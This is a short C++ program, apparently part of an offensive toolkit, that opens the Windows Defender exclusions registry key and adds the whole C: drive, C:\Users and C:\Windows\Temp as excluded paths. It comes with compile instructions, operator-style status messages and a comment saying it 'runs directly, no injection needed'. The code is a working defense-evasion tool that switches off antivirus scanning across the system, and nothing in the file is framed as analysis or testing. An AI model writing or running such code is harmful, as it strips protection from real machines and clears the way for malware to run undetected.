#include <windows.h>
#include <iostream>

// Standalone exclusion adder - runs directly, no injection needed
// Requires: Admin privileges
// Compile: cl add_exclusion.cpp advapi32.lib /Fe:add_exclusion.exe /EHsc /nologo

bool AddExclusion(const wchar_t* path) {
    HKEY hKey;
    LSTATUS status = RegOpenKeyExW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
        0, KEY_SET_VALUE, &hKey
    );
    if (status != ERROR_SUCCESS) {
        std::wcerr << L"[!] RegOpenKeyEx failed: " << status << L" (need admin)" << std::endl;
        return false;
    }
    DWORD val = 0;
    status = RegSetValueExW(hKey, path, 0, REG_DWORD, (BYTE*)&val, sizeof(DWORD));
    RegCloseKey(hKey);
    if (status != ERROR_SUCCESS) {
        std::wcerr << L"[!] RegSetValueEx failed: " << status << std::endl;
        return false;
    }
    std::wcout << L"[+] Added exclusion: " << path << std::endl;
    return true;
}

int main() {
    std::wcout << L"[*] Adding Defender exclusions..." << std::endl;
    AddExclusion(L"C:\\");
    AddExclusion(L"C:\\Users");
    AddExclusion(L"C:\\Windows\\Temp");
    std::wcout << L"[*] Done. Verify with:" << std::endl;
    std::wcout << L"    reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\"" << std::endl;
    return 0;
}
